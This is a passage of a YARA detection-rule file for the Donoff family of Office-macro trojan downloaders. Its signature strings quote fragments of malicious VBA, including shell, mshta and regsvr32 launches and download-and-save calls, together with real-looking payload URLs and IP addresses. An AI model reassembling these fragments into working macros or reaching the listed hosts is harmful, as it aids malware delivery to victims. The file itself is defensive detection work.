        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Application.ScreenUpdating = False" ascii //weight: 1
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-15] 28 22 34 64 36 39 36 33 37 32 36 66 37 33 36 66 22 29 20 26 20 [0-15] 28 22 36 36 37 34 32 65 35 38 34 64 34 63 34 38 35 34 35 34 35 30 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-15] 28 22 34 31 36 34 36 66 36 34 36 32 32 65 35 33 37 34 37 32 36 35 22 29 20 26 20 [0-15] 28 22 36 31 36 64 22 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 70 65 6e 20 [0-15] 28 22 34 37 34 35 35 34 22 29 2c 20 [0-15] 28 22 36 38 37 34 37 34 37 30 33 61 32 66 32 66 33 33 33 37 32 65 33 35 33 39 22 29 20 26 20 [0-15] 28 22 32 65 33 31 33 36 33 30 32 65 33 31 33 34 33 37 32 66 37 36 36 35 37 32 37 33 36 39 36 66 36 65 35 66 33 34 32 65 36 35 37 38 36 35 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_5 = "= Environ(\"AppData\")" ascii //weight: 1
        $x_1_6 = {53 68 65 6c 6c 20 28 [0-18] 20 26 20 [0-15] 28 22 35 63 33 31 22 29 20 26 20 [0-15] 28 22 33 33 33 30 36 39 36 37 36 61 37 34 33 34 32 65 36 35 37 38 36 35 22 29 29}  //weight: 1, accuracy: Low
        $x_1_7 = {43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-15] 2c 20 [0-15] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_8 = {77 72 69 74 65 20 [0-18] 2e 72 65 73 70 6f 6e 73 65 42 6f 64 79}  //weight: 1, accuracy: Low
        $x_1_9 = {73 61 76 65 74 6f 66 69 6c 65 20 [0-18] 20 26 20 [0-15] 28 22 35 63 33 31 33 33 33 30 36 39 36 37 36 61 37 34 33 34 32 65 36 35 22 29 20 26 20 [0-15] 28 22 37 38 36 35 22 29 2c 20 32}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXSL_2147780178_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXSL!MTB"
        threat_id = "2147780178"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Attribute VB_Name = \"documentIndexProc\"" ascii //weight: 1
        $x_1_2 = "dataOptionLocal(\"SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVw=\")" ascii //weight: 1
        $x_1_3 = "dataOptionLocal(\"XFdvcmRcU2VjdXJpdHlcQWNjZXNzVkJPTQ==\")" ascii //weight: 1
        $x_1_4 = "CreateObject(\"wscript.shell\").RegWrite" ascii //weight: 1
        $x_1_5 = "valueDocumentConvert = UserForm1.TextBox1" ascii //weight: 1
        $x_1_6 = "CreateObject(\"msxml2.domdocument\")" ascii //weight: 1
        $x_1_7 = "DataType = \"bin.base64\"" ascii //weight: 1
        $x_1_8 = "CreateObject(\"word.application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXFD_2147780271_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXFD!MTB"
        threat_id = "2147780271"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"MSXML2.DOMDocument\")" ascii //weight: 1
        $x_1_2 = "xmlDoc.createElement(\"b64\")" ascii //weight: 1
        $x_1_3 = "dataType = \"bin.base64\"" ascii //weight: 1
        $x_1_4 = "Text = base64" ascii //weight: 1
        $x_1_5 = "Base64Decode = xmlNode.nodeTypedValue" ascii //weight: 1
        $x_1_6 = "decData = Base64Decode(data)" ascii //weight: 1
        $x_1_7 = "strPath = strPath & Chr((decData(inx) Xor 37) + 134 - 256)" ascii //weight: 1
        $x_1_8 = "(ActiveDocument.Shapes(\"Text Box 3\")" ascii //weight: 1
        $x_1_9 = "(ActiveDocument.Shapes(\"Text Box 4\")" ascii //weight: 1
        $x_1_10 = "(ActiveDocument.Shapes(\"Text Box 5\")" ascii //weight: 1
        $x_1_11 = "(ActiveDocument.Shapes(\"Text Box 6\")" ascii //weight: 1
        $x_1_12 = "objShell = CreateObject(strObject)" ascii //weight: 1
        $x_1_13 = "objShell.Run strArgment" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXIR_2147780420_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXIR!MTB"
        threat_id = "2147780420"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "exec$ (sr(ExArrayLocal))" ascii //weight: 1
        $x_1_2 = "CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_3 = "ActiveDocument.BuiltInDocumentProperties(\"title\")" ascii //weight: 1
        $x_1_4 = "globalClear['Timeout'] =\" & \" 60000;" ascii //weight: 1
        $x_1_5 = "return namespaceB\" & \"utton.split('').reverse().join('\"" ascii //weight: 1
        $x_1_6 = "\"NpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3\"" ascii //weight: 1
        $x_1_7 = "k9YZXZpdGNBIHdlbg==" ascii //weight: 1
        $x_1_8 = "ptrRepo = 31337" ascii //weight: 1
        $x_1_9 = "\"l0Y0Egd2VuID0geWFyckF0bmVtdWdyYS\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXIS_2147780468_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXIS!MTB"
        threat_id = "2147780468"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "WshShell.SpecialFolders(\"Printhood\")" ascii //weight: 1
        $x_1_3 = "CreateObject(\"microsoft.xmlhttp\")" ascii //weight: 1
        $x_1_4 = "CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_5 = "CreateObject(\"adodb.stream\")" ascii //weight: 1
        $x_1_6 = "KHUugigfuydDTJk(0) = 233" ascii //weight: 1
        $x_1_7 = "KHUugigfuydDTJk(1) = 139" ascii //weight: 1
        $x_1_8 = "KHUugigfuydDTJk(2183)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MXIT_2147780514_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MXIT!MTB"
        threat_id = "2147780514"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FileNlme = \" http://www.j.mp/ajdddsdsdifdiijijsjcjosdj\"" ascii //weight: 1
        $x_1_2 = "Shell% _" ascii //weight: 1
        $x_1_3 = "FileNoome + FileNllme, 1" ascii //weight: 1
        $x_1_4 = "FileNllme = hill.FileNlme" ascii //weight: 1
        $x_1_5 = "FileNoome = hill.FileNxme" ascii //weight: 1
        $x_1_6 = "FileNxme = \"mshta\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRG_2147780746_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRG!MTB"
        threat_id = "2147780746"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Ie7QGv2LFfiBKFDWmLVNw_co" ascii //weight: 1
        $x_1_2 = "iosadfodsi 5646 dsafdsyagf8 fisduerw98" ascii //weight: 1
        $x_1_3 = "D__S(167) & D__S(177) & D__S(200) & D__S(132) & D__S(147) & D__S(167) & D__S(132) & D__S(209) & D__S(194) & D__S(183) & D__S(205) & D__S(169) & D__S(194) & D__S(220) & D__S(194) & D__S(201) & D__S(194) & D__S(199)" ascii //weight: 1
        $x_1_4 = ".Run(AH1Lr_MTEGSsDpkkxTA2v5ZrxIzW_5vu3pTpmR_lp_fXXMWazbOxxt__sJXh4yOJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MOV_2147780827_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MOV!MTB"
        threat_id = "2147780827"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 2
        $x_2_2 = "CreateObject(\"Adodb.Stream\")" ascii //weight: 2
        $x_10_3 = "\"GET\", \"http://f0540378.xsph.ru/12_CNB_Programas_de_Becas-70212-em.exe\"" ascii //weight: 10
        $x_1_4 = "savetofile \"12_CNB_Programas_de_Becas-70212-em.exe\"" ascii //weight: 1
        $x_10_5 = "\"GET\", \"https://occurrent-fatigues.000webhostapp.com/\"" ascii //weight: 10
        $x_1_6 = "Shell (\"12_CNB_Programas_de_Becas-70212-em.bat\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_MOI_2147780836_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MOI!MTB"
        threat_id = "2147780836"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FileName = \"m\" + \"s\" + \"h\" + \"t\" + \"a\"" ascii //weight: 1
        $x_1_2 = "FileNome = \"h\" + \"t\" + \"t\" + \"p\" + \":\" + \"/\" + \"/\" + \"w\" + \"w\" + \"w\" + \".\" + \"j\" + \".\" + \"m\" + \"p\" + \"/\" + \"sducsj" ascii //weight: 1
        $x_1_3 = "FileNome = hill.FileNome" ascii //weight: 1
        $x_1_4 = "Call ShellExecute(0&, vbNullString, FileName," ascii //weight: 1
        $x_1_5 = "ShellExecute Lib \"shell32.dll\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRB_2147781017_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRB!MTB"
        threat_id = "2147781017"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "IThV6QwIZ3VSEhFuUIunwH3Nta4dQgx" ascii //weight: 1
        $x_1_2 = "pZH__f_GiFhtaC9J8sjXNykTMugm_pttsCZI_irT_aTlXVB87Zkfwpm" ascii //weight: 1
        $x_1_3 = "d___fsa(109) & d___fsa(105) & d___fsa(89) & d___fsa(136) & d___fsa(127) & d___fsa(134) & d___fsa(138) & d___fsa(68) & d___fsa(137) & d___fsa(126) & d___fsa(123) & d___fsa(130) & d___fsa(130)" ascii //weight: 1
        $x_1_4 = ".Run(vxbWUABSD_W_D9, r4uCWk_c4x7QY5)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRC_2147781034_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRC!MTB"
        threat_id = "2147781034"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".write xHttp.responseBody" ascii //weight: 1
        $x_1_2 = {6d 61 69 6c 73 65 6e 64 69 6e 67 2e 73 69 74 65 2f 48 61 70 70 79 5f 43 53 2f 68 61 70 70 79 46 75 6e 2e 65 78 65 22 2c 20 46 61 6c 73 65 44 00 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = {57 69 6e 64 6f 77 73 2f 54 65 6d 70 2f 4d 69 63 72 6f 73 6f 66 74 20 57 6f 72 6c 64 2e 65 78 65 22 32 00 2e 73 61 76 65 74 6f 66 69 6c 65 20 22 43 3a 2f 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRC_2147781034_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRC!MTB"
        threat_id = "2147781034"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pKyyL7wiEfgYQIVNyNe_ffqp_" ascii //weight: 1
        $x_1_2 = "FWyFBNUo7i_Ocg_c_9_rBjz_q9vE3nJJOb46zscE5u_F_mYFpG_AG78" ascii //weight: 1
        $x_1_3 = "d___fsa(109) & d___fsa(105) & d___fsa(89) & d___fsa(136) & d___fsa(127) & d___fsa(134) & d___fsa(138) & d___fsa(68) & d___fsa(137) & d___fsa(126) & d___fsa(123) & d___fsa(130) & d___fsa(130)" ascii //weight: 1
        $x_1_4 = ".Run(WGLFLrF9v3c_, wgW7BpT___s_GAC2yd9O)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_MOT_2147781253_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.MOT!MTB"
        threat_id = "2147781253"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xqaukpxzwrdcojyvwbat Lib \"Document1.asd\"" ascii //weight: 1
        $x_1_2 = "bdgkpxfbfmpz(\"446f63756d656e7431\") & bdgkpxfbfmpz(\"2e617364\")" ascii //weight: 1
        $x_1_3 = "hyvqmgchlyurkwlra dswvizwojxazgvbqvhr, \"77 90 144 0 3 0 0 0 4 0 0 0 255 255" ascii //weight: 1
        $x_1_4 = "dswvizwojxazgvbqvhr.Write Chr(aNumbers(iIter))" ascii //weight: 1
        $x_1_5 = "hyvqmgchlyurkwlra dswvizwojxazgvbqvhr, \"204 204 204 204 204 204 204" ascii //weight: 1
        $x_1_6 = "hyvqmgchlyurkwlra dswvizwojxazgvbqvhr, \"35 72 139 87 16 72 139 206 232 214 255 255 255" ascii //weight: 1
        $x_1_7 = "CreateObject(hsneosizrgdj(\"5363\") & hsneosizrgdj(\"72697074696e672e46696c6553797374656d4f626a656374\")" ascii //weight: 1
        $x_1_8 = "rndeoiqkrg dswvizwojxazgvbqvhr" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRI_2147781400_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRI!MTB"
        threat_id = "2147781400"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Chr(64) & Chr(69) & Chr(67) & Chr(72) & Chr(79)" ascii //weight: 1
        $x_1_2 = "U0k.VBS  & tIMeOUT 13 & OC.exe" ascii //weight: 1
        $x_1_3 = "Chr(Asc(V9j)- 25) >>U0k.VBS" ascii //weight: 1
        $x_1_4 = "Shell Chr(502 - 435) & Chr(484 - 407) & Chr(405 - 305) & Chr(973 - 941) & Chr(979 - 932) & Chr(426 - 327) & Chr(973 - 941) & Chr(426 - 327) & Chr(405 - 305)" ascii //weight: 1
        $x_1_5 = {63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 38 34 33 30 37 33 34 36 31 31 37 32 39 36 31 33 32 32 2f 38 34 33 32 31 37 31 31 37 38 31 36 38 31 35 37 32 36 2f 43 68 72 6f 6d 65 2e 65 78 65 57 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRT_2147781874_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRT!MTB"
        threat_id = "2147781874"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Mid(\"i\\4FT-KWscript.Shell" ascii //weight: 1
        $x_1_2 = "K$xIU\\8838.exe" ascii //weight: 1
        $x_1_3 = "CLng(0 Or 6), CLng((668 + -653#) And 9))" ascii //weight: 1
        $x_1_4 = "CTTvV,b\", \"\"" ascii //weight: 1
        $x_1_5 = "parochiallywart" ascii //weight: 1
        $x_1_6 = "WpEhtBAtf1.php" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRT_2147781874_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRT!MTB"
        threat_id = "2147781874"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "carinterface_name" ascii //weight: 1
        $x_1_2 = "Error1.Image7788111.Tag" ascii //weight: 1
        $x_1_3 = "Error1.Image7788112.ControlTipText" ascii //weight: 1
        $x_1_4 = "kamatera + \" \" + Manhoos + merawa + terhowa" ascii //weight: 1
        $x_1_5 = "Shell i_name" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SMA_2147781880_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SMA!MTB"
        threat_id = "2147781880"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://www.bitly.com/asahdjiaiaaarqawn" ascii //weight: 1
        $x_1_2 = "\"m\" + \"s\" + \"h\" + \"t\" + \"a\"" ascii //weight: 1
        $x_1_3 = {28 53 74 72 52 65 76 65 72 73 65 20 5f 90 02 04 28 22 30 30 30 30 34 35 33 35 35 34 34 34 2d 45 39 34 41 2d 45 43 31 31 2d 39 37 32 43 2d 30 32 36 39 30 37 33 31 3a 77 65 6e 22 29 20 5f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SMA_2147781880_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SMA!MTB"
        threat_id = "2147781880"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Chr(34) & \";C:\\Users\\Public\\Documents\\ontoneed.ex\" &" ascii //weight: 1
        $x_1_2 = "& Chr(34) & \"http://209.141.61.124/Q-2/ConsoleApp9.ex\" &" ascii //weight: 1
        $x_1_3 = "& Chr(34) & \"http://209.141.61.124/Q-2/asd80.ex\" &" ascii //weight: 1
        $x_1_4 = "Chr(34) & \";C:\\Users\\Public\\Documents\\theenjoy.ex\" &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SMB_2147782061_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SMB!MTB"
        threat_id = "2147782061"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "& Chr(34) & \"http://scaladevelopments.scaladevco.com/17/ConsoleApp18.ex\" &" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SMB_2147782061_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SMB!MTB"
        threat_id = "2147782061"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hpAYxbvQ.wY8HkRtTlQx7_mD__8uo" ascii //weight: 1
        $x_1_2 = "= CreateObject(U_uniuRyYIpobSi)" ascii //weight: 1
        $x_1_3 = ".Run(" ascii //weight: 1
        $x_1_4 = "= Chr(G___U - 60)" ascii //weight: 1
        $x_1_5 = "WwBTAFkAUwBUAEUATQAuAHQAZQBYAFQALgBFAG4AQwBvAGQASQBuAGcAXQA6ADoAdQBOAEkAYwBPAEQARQAuAEcAZQB0AFMAdAByAGkAbgBHACgAWwBzAHkAUwBUAG" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SMC_2147782227_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SMC!MTB"
        threat_id = "2147782227"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "WwBTAHkAUwBUAGUAbQAuAHQAZQBYAHQALgBlAG4AQwBvAGQAaQBuAGcAXQA6ADoAVQBOAGkAYwBvAEQAZQAuAEcAZQB0AHMAdABSAGkATgBnACgAWwBzAFkAcwBUAG" ascii //weight: 1
        $x_1_2 = "ghgf = \"hj uyjuy thyty uyjyujtyt" ascii //weight: 1
        $x_1_3 = "fgghjhg = \"sdad dsafh dsauif dasf" ascii //weight: 1
        $x_1_4 = "jap.Run(" ascii //weight: 1
        $x_1_5 = "FB.Iy" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRY_2147782403_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRY!MTB"
        threat_id = "2147782403"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Ken sisters wv" ascii //weight: 1
        $x_1_2 = {34 30 37 2e 63 64 2e 67 6f 76 2e 6d 6e 2f 5f 57 35 34 73 45 6f 5a 4b 6c 2d 6d 32 77 36 52 5a 2e 70 68 70 3f 78 3d 4d 44 41 77 4d 53 44 71 75 46 6a 6e 6e 51 66 4e 73 6b 75 51 77 58 53 46 70 79 48 30 5a 39 4b 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "yv.exec \"regsvr32 c:\\programdata\\1.dat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRY_2147782403_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DRY!MTB"
        threat_id = "2147782403"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"w\" + \".\" + \"b\" + \"i\" + \"t\" + \"l\" + \"y\" + \".\" + \"c\" + \"o\" + \"m/hwdinnwsnwddkwmkwmmwqwhda\"" ascii //weight: 1
        $x_1_2 = "\"w\" + \".\" + \"b\" + \"i\" + \"t\" + \"l\" + \"y\" + \".\" + \"c\" + \"o\" + \"m/hwdinnwsnkdwmwqwhda\"" ascii //weight: 1
        $x_1_3 = "\"w\" + \".\" + \"b\" + \"i\" + \"t\" + \"l\" + \"y\" + \".\" + \"c\" + \"o\" + \"m/hwdinnwsnkdwwdmnmwqwhda\"" ascii //weight: 1
        $x_1_4 = "public%\"" ascii //weight: 1
        $x_1_5 = "SW_SHOWMinimize)" ascii //weight: 1
        $x_1_6 = "SW_SHOWMAXIMIZED" ascii //weight: 1
        $x_1_7 = "(0, \"open\", koko, \"h\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DRD_2147782765_0
{
    meta:
